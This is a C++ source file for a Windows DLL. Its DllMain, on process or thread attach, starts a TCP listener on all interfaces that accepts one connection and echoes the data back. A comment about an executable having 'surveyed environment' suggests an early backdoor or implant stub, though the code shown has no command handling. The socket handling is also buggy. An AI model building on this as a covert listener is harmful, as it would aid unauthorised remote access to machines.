// Patrick Sacchet
// Defines the entry point for the DLL application; main handler for user specific calls
#include "pch.h"
#include "debug.h"
#include "dllmain.h"


BOOL startListen(fstream &debugFile)
{
    WORD wsaVersion;
    WSADATA wsaData;
    int status= 0;
    int sendStatus = 0;
    int recvBufLen = DEFAULT_BUFLEN;

    char recvBuf [DEFAULT_BUFLEN];

    wsaVersion = MAKEWORD(2, 2);

    status = WSAStartup(wsaVersion, &wsaData);
    if (status)
    {
        InternalDebug::DebugOutput::writeFile(debugFile, "ERROR: Wsastartup did not complete successfully \n");
        string errorCode = "Error code: %u \n", status;
        InternalDebug::DebugOutput::writeFile(debugFile,errorCode);
        return FALSE;
    }
    InternalDebug::DebugOutput::writeFile(debugFile, "WSAStartup was successful \n");
    std::cout << "WSAStartup was successful \n";

    // Information for target
    SOCKADDR_IN client;

    client.sin_family = AF_INET;
    client.sin_port = htons(PORT_NUM);
    // Accept any IP address
    client.sin_addr.s_addr = htonl(INADDR_ANY);
    SOCKET clientSock = INVALID_SOCKET;
    SOCKET serverSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (serverSock == INVALID_SOCKET)
    {
        InternalDebug::DebugOutput::writeFile(debugFile, "ERROR: Could not successfully create socket \n");
        return FALSE;
    }

    if (bind(serverSock, (LPSOCKADDR)&client, sizeof(client)) == SOCKET_ERROR)
    {
        InternalDebug::DebugOutput::writeFile(debugFile, "ERROR: Could not bind socket \n");
        return FALSE;
    }
    std::cout << "Listening on port... \n";

    status = listen(serverSock, SOMAXCONN);
    if (status == SOCKET_ERROR)
    {
        std::cout << "SOCKET ERROR";
        closesocket(serverSock);
        WSACleanup();
        return FALSE;
    }

    clientSock = accept(serverSock, NULL, NULL);
    if (clientSock == INVALID_SOCKET)
    {
        std::cout << "INVALID SOCKET FROM CLIENT";
        closesocket(serverSock);
        WSACleanup();
        return FALSE;
     }

    // dont need server socket anymore
    closesocket(serverSock);

    // receive from client until the peer shuts down the connection
    do
    {
        status = recv(clientSock, recvBuf, recvBufLen, 0);
        if (status > 0)
        {
            printf( "Bytes received: %d", status);

            sendStatus = send(clientSock, recvBuf, status, 0);
            if (sendStatus == SOCKET_ERROR)
            {
                printf( "SEND ERROR: %d", sendStatus);
                closesocket(clientSock);
                WSACleanup();
                return FALSE;
            }
            printf("Bytes sent: %d", sendStatus);
        }
        else if (status == 0)
        {
            std::cout << "Closing socket";
        }
        else
        {
            printf("Recv failed with error %d", WSAGetLastError());
            closesocket(clientSock);
            WSACleanup();
            return FALSE;
        }
        closesocket(clientSock);
        WSACleanup();

    } while (status > 0);

    // shutdown connection since we're done
    status = shutdown(clientSock, SD_SEND);
    if (status == SOCKET_ERROR)
    {
        printf("shutdown failed with error: %d", WSAGetLastError());
        closesocket(clientSock);
        WSACleanup();
        return FALSE;
    }

    closesocket(clientSock);
    WSACleanup();

    // Parse initial packet data and call appropiate handler from here

    return TRUE;
}



BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
        BOOL status;
        // Executable has surveyed environment and deemed it safe to operate; make calls specific to functionality here
        case DLL_PROCESS_ATTACH:
        {
            std::cout << "INSIDE DLLMAIN \n";
            // Pass control to our listening function and wait for user input 
            fstream debugFile = InternalDebug::DebugOutput::createDebugFile();
            status = InternalDebug::DebugOutput::writeFile(debugFile, "test \n");
            if (!status)
            {
                break;
            }
            status = startListen(debugFile);
            std::cout << "START LISTEN FINISH\n";
            break;
        }
        case DLL_THREAD_ATTACH:
        {
            // Pass control to our listening function and wait for user input 
            fstream debugFile = InternalDebug::DebugOutput::createDebugFile();
            status = InternalDebug::DebugOutput::writeFile(debugFile, "test \n");
            if (!status)
            {
                break;
            }
            status = startListen(debugFile);
            break;
            break;
        }
        case DLL_THREAD_DETACH:
        {
            break;
        }
        // General cleanup before detaching and de-loading out of memory
        case DLL_PROCESS_DETACH:
        {
            break;
        }
    }

    return TRUE;
}

